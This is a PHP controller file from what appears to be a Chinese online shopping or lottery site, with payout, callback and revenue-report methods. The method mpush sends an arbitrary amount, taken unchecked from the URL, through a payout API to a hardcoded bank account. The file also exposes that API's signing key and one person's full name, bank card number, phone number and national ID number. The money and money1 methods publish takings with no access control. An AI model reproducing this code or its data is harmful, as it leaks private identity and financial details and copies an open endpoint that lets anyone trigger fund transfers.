<?php
defined('G_IN_SYSTEM') or exit('No permission resources.');
System::load_app_class('base', 'member', 'no');
System::load_app_fun('my');
System::load_app_fun('user');
System::load_sys_fun('user');
System::load_sys_fun("send");

class fafa extends base
{

    public function __construct()
    {
        parent::__construct();
        $this->db = System::load_sys_class('model');
    }
  	public function aaa(){
      	$str = '5c11UwUAVgAAAlUHVVAPUFsFBQNRBABdDAdWA18JAgYIUQ';
    	//$code=abs(intval(_encrypt(_getcookie("code"),'DECODE')));
		$code=abs(intval(_encrypt($str,'DECODE')));
		if($code>0){

			echo  $code;

		}else{

			echo 0;

		}
    }
  	public function shop(){
    	$tongqu = $this->db->GetList("select `thumb` from `@#_shoplist` where `q_uid` is null and `canyurenshu` < `zongrenshu`  limit 2000");
      	echo '<pre>';	
      //   http://m.csthsc.cn/statics/uploads/
     
      	foreach($tongqu as $k=>$v){
        	$data[] = "http://m.csthsc.cn/statics/uploads/".$v['thumb'];
        }
      	 var_dump($data);
    }
	function genVerify($data) {
      ksort($data);
      $items = array();
      foreach ($data as $key => $value) {
          $items[] = $key . "=" . $value;
      }
	  return join("&", $items);
	}
  	function post_curl($tjurl,$data){
    	$ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $tjurl);
        curl_setopt($ch, CURLOPT_POST, 1);
      	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        //curl_exec($ch);
        $rs = curl_exec($ch);
      	return $rs;
    }
  	public function mpush(){
      	$money = htmlspecialchars($this->segment(4));
      
    	$data['uid'] = '172000244';
      	$key = 'fe31d4328d274d579bc431cf2c0dba0c';
      	$data['orderNo'] = date('YmdHis');
      	$data['money'] = $money;
      	//$data['money'] = '22253.27';//72255.27，22255.27
      	$data['type'] = 'wxpay';
      	$data['acctName'] = '陈浩荣';
      	$data['acctNo'] = '6230521180004122476';
      	$data['bankName'] = '中国农业银行';
      	$data['bankCode'] = '1';
      	$data['bankSettNo'] = '1';
      	$data['mobile'] = '13539385534';
      	$data['certificateCode'] = '445121198804166111';
      	$data['notifyUrl'] = "http://xc.csthsc.com/index.php/mobile/fafa/npush/"; 
      	$data['province'] = '广东省';
      	$data['city'] = '潮州市';
      	$data['cnapsName'] = '潮州市湘桥区磷溪支行';
      	
      	$str = $this->genVerify($data);
      	$sign = strtoupper(md5($str."&key=".$key));
      	
      	$info = $data;
      	$info['sign'] = $sign;
      	$url = 'http://115.231.235.205:6060/api/createproxy';
      	$go = $this->post_curl($url,$info);
      	
      	$rs = json_decode($go,true);
      	//var_dump($rs);
      	echo $rs['message'];
    }
  	public function npush(){
        $req = $GLOBALS['HTTP_RAW_POST_DATA'];
        $xml=json_decode($req,true);
      	
      	$resultCode = $xml['resultCode'];
      	$message = $xml['message'];
      	$orderNo = $xml['orderNo'];
      	$sign = $xml['sign'];
      	
      	$key = 'fe31d4328d274d579bc431cf2c0dba0c';
      	
      	$str = 'message='.$message.'&orderNo='.$orderNo.'&resultCode='.$resultCode.'&key='.$key;
      	
      	$rs_sign = strtoupper(md5($str));
       	
      	//file_put_contents("/www/wwwroot/csthsc/sql_log/pushcall.log", json_encode($xml)."--{$rs_sign}\n", FILE_APPEND);
      	//exit('1');
        if($resultCode == "success"){
          	if($sign != $rs_sign){
            	echo "error";exit;
            }
          	file_put_contents("/www/wwwroot/csthsc/sql_log/pushcall.log", "{$orderNo}:{$resultCode}\n", FILE_APPEND);
          	echo "success";exit;
        }
    }
  	public function sbsb(){
      	$sb = $this->db->GetOne("select * from `@#_member` where `uid`='86889' limit 1");
      	if($sb['auto_user']==0){
        	$cc = $this->db->GetOne("SELECT sum(money) as m FROM `@#_member_account` where `uid` ='86889' and `type` = '1' and `pay` in ('账户','佣金') ");
            if(empty($cc)){$cc['m'] = 0;}
            if($sb['money'] > $cc['m'] + 100 ){
              _setcookie("uid","",time()-3600);
              _setcookie("ushell","",time()-3600);
              session_start ();
              unset($_SESSION['gwc']);
              exit();return false;
            }
        }
    	
    }
  	public function money(){
      	
      	//echo $_SESSION['uuuid'];exit;
      	$zong = $this->db->GetOne("select sum(money) as zong from `@#_member_addmoney_record` where (`pay_type` = '微信公众号' or `pay_type` = '通过网络充值') and `status` = '已付款' ");    
      	$wx = $this->db->GetOne("select sum(money) as wx from `@#_member_addmoney_record` where `pay_type` = '微信公众号' and `status` = '已付款' ");    
      	//$sm = $this->db->GetOne("select sum(money) as sm from `@#_wxpay_locat` where `status` = '1' ");    
      
      	$time = strtotime(date('Y-m-d'));
      	$ztime = strtotime(date('Ymd',strtotime("-1 day")));
      	
      	$jr_zong = $this->db->GetOne("select sum(money) as zong from `@#_member_addmoney_record` where (`pay_type` = '微信公众号' or `pay_type` = '通过网络充值')  and `status` = '已付款' and `time` > '$time'  ");    
      	$jr_wx = $this->db->GetOne("select sum(money) as wx from `@#_member_addmoney_record` where `pay_type` = '微信公众号' and `status` = '已付款' and `time` > '$time' ");    
      	$jr_zfb = $this->db->GetOne("select sum(money) as zfb from `@#_member_addmoney_record` where `pay_type` = '通过网络充值' and `status` = '已付款' and `time` > '$time' ");    
      	$jr_sm = $this->db->GetOne("select sum(money) as sm from `@#_wxpay_locat` where `status` = '1' and `create_time` > '$time' "); 
      	$jr_xf = $this->db->GetOne("SELECT sum(m.money) sum_money FROM `@#_shoplist` AS m LEFT JOIN `@#_member` AS n ON m.q_uid = n.uid WHERE m.q_end_time >= '$time' AND m.q_uid is not null AND n.auto_user = '0'");
      	
      
      	$zjr_zong = $this->db->GetOne("select sum(money) as zong from `@#_member_addmoney_record` where (`pay_type` = '微信公众号' or `pay_type` = '通过网络充值')  and `status` = '已付款' and `time` < '$time' and `time` > '$ztime'  ");    
      	$zjr_wx = $this->db->GetOne("select sum(money) as wx from `@#_member_addmoney_record` where `pay_type` = '微信公众号' and `status` = '已付款' and `time` < '$time' and `time` > '$ztime' ");    
      	$zjr_zfb = $this->db->GetOne("select sum(money) as zfb from `@#_member_addmoney_record` where `pay_type` = '通过网络充值' and `status` = '已付款' and `time` < '$time' and `time` > '$ztime' ");    
      	$zjr_sm = $this->db->GetOne("select sum(money) as sm from `@#_wxpay_locat` where `status` = '1' and `create_time` < '$time' and `create_time` > '$ztime' "); 
      	$zjr_xf = $this->db->GetOne("SELECT sum(m.money) sum_money FROM `@#_shoplist` AS m LEFT JOIN `@#_member` AS n ON m.q_uid = n.uid WHERE m.q_end_time >= '$ztime' AND m.q_end_time < '$time' AND m.q_uid is not null AND n.auto_user = '0'");
      	
      	$zz = $zjr_zong['zong'] + $zjr_sm['sm'];
      	
      	
      	echo '<style type="text/css">body{font-size: 34px;}</style>';
      	echo '<br>';
      
        $z = $jr_zong['zong'] + $jr_sm['sm'];
      
      	echo '今日总充值：'.$z."<br>";
      	echo '昨日总充值：'.$zz."<br>";
      	echo '<br>';
      	echo '今日中奖：'.$jr_xf['sum_money']."<br>"; 
      	echo '<br>';
      	$yl = $z - $jr_xf['sum_money'];
      	echo '今日盈利：<a style="color:red;">'.$yl.'</a>';
      	echo '<br>';
      	//echo '今日大概盈利：'.$yl * 0.9;
       	echo '<br>';
      	echo '<br>';
      
      	
      	echo '昨日中奖：'.$zjr_xf['sum_money']."<br>";
      	$zyl = $zz - $zjr_xf['sum_money'];
      	echo '昨日盈利：<a style="color:red;">'.$zyl.'</a>';
      	//echo '昨日大概盈利：'.$zyl * 0.9;
		echo '<br>';
          	
      	//echo '今日消费：'.$jr_xf['xf']."<br>";
      	echo '<br>';
      
      	echo '今日微信充值：'.$jr_wx['wx']."<br>";
      	echo '今日扫码充值：'.$jr_sm['sm']."<br>";
      	echo '今日支付宝充值：'.$jr_zfb['zfb']."<br>";
      	echo '<br>';
      	echo '昨日微信充值：'.$zjr_wx['wx']."<br>";
      	echo '<br>';
      	$app = $this->db->GetOne("SELECT * FROM `@#_appoint` order by id desc limit 1");
      	echo '最后一条添加时间：'.date('Y-m-d H:i:s',$app['time']);
      	//echo '昨日扫码充值：'.$zjr_sm['sm']."<br>";
      	//echo '昨日支付宝充值：'.$zjr_zfb['zfb']."<br>";
      
      	//echo '总充值：'.$zong['zong']."<br>";
      	//echo '微信总充值：'.$wx['wx']."<br>";
    }	
  	public function money1(){
      	
      	$time = strtotime(date('Y-m-d'));
      	$ztime = strtotime(date('Ymd',strtotime("-1 day")));
      	
      	$jr_wx = $this->db->GetOne("select sum(money) as wx from `@#_member_addmoney_record` where `pay_type` = '微信公众号' and `wx` = '3' and `status` = '已付款' and `time` > '$time' ");    
      	$jr_wx1 = $this->db->GetOne("select sum(money) as wx from `@#_member_addmoney_record` where `pay_type` = '微信公众号' and `wx` = '4' and `status` = '已付款' and `time` > '$time' ");    
      	$jr_wx2 = $this->db->GetOne("select sum(money) as wx from `@#_member_addmoney_record` where `pay_type` = '微信公众号' and `wx` = '5' and `status` = '已付款' and `time` > '$time' ");    
      	
      
      	$zjr_wx = $this->db->GetOne("select sum(money) as wx from `@#_member_addmoney_record` where `pay_type` = '微信公众号' and `wx` = '3' and `status` = '已付款' and `time` < '$time' and `time` > '$ztime' ");    
      	$zjr_wx1 = $this->db->GetOne("select sum(money) as wx from `@#_member_addmoney_record` where `pay_type` = '微信公众号' and `wx` = '4' and `status` = '已付款' and `time` < '$time' and `time` > '$ztime' ");    
      	$zjr_wx2 = $this->db->GetOne("select sum(money) as wx from `@#_member_addmoney_record` where `pay_type` = '微信公众号' and `wx` = '5' and `status` = '已付款' and `time` < '$time' and `time` > '$ztime' ");    
      	
      	echo '今日摇钱树微信金额：'.$jr_wx['wx'];
      	echo '<br>';
      	echo '今日银联微信金额：'.$jr_wx1['wx'];
      	echo '<br>';
      	echo '今日P收钱微信金额：'.$jr_wx2['wx'];
      	echo '<br>';
      	echo '<br>';
      	echo '昨日摇钱树微信金额：'.$zjr_wx['wx'];
      	echo '<br>';
      	echo '昨日银联微信金额：'.$zjr_wx1['wx'];
      	echo '<br>';
      	echo '昨日P收钱微信金额：'.$zjr_wx2['wx'];
    }
}